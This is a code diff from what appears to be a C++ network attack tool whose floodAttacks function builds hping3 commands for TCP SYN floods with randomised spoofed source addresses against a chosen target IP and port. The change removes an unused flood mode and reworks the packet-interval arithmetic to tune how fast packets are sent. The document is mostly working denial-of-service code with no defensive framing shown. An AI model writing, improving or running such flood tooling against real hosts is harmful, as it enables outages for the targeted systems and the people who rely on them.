@@ -28,13 +28,11 @@ enum cyberattacks {
 enum tcpfloodattacktypes {
      FLOOD=1,
      FIXEDDURATION,
-     FASTPACKETCOUNTFLOOD,
      PACKETSPERSEC,
      ENDOFENUM //Final enum value. Do not modify.Add new values before this.
 };
 string floodAttackString[ENDOFENUM-1]={"FLOOD",
                                        "FIXEDDURATION",
-                                       "FASTPACKETCOUNTFLOOD",
                                        "PACKETSPERSEC",
                                        };
 
@@ -237,7 +235,10 @@ void floodAttacks(const string attackType)
         }
         int totalPkts=pD*pPS;
         packetCount=static_cast<ostringstream *>(&(ostringstream() << (totalPkts)) )->str();
-        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (pPS*1000)) )->str());
+        int reductionFactor=pPS/10;
+        if(!reductionFactor)
+           reductionFactor=10/pPS;
+        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (100000)/reductionFactor)) )->str();
         commandStr= "hping3 -c " + packetCount + 
                       " -d " + packetSize + " -" + attackType +
                       " -w 64 -i "+packetInterval+ " -p " + port +
@@ -245,22 +246,22 @@ void floodAttacks(const string attackType)
 
       }
         break;
-      case FASTPACKETCOUNTFLOOD:
-      {
-      }
-        break;
       case PACKETSPERSEC:
       {
         int pPS;
-        print("Input the  number of packets to send per second ::");
+        print("Input the  number of packets to send per second  ::");
         getline(cin,packetPerSec);
         {
           stringstream inputStream(packetPerSec);
           inputStream >> pPS;
         }
-        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (pPS*1000)) )->str());
-        commandStr= "hping3 -c " + packetCount + 
-                      " -d " + packetSize +
+        int reductionFactor=pPS/10;
+        if(!reductionFactor)
+           reductionFactor=10/pPS;
+
+        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (100000)/reductionFactor) )->str());
+        commandStr= "hping3 -d "  
+                      + packetSize +
                       " -S -w 64 -i "+packetInterval+ " -p " + port +
                       " --rand-source " + targetIP;
       }
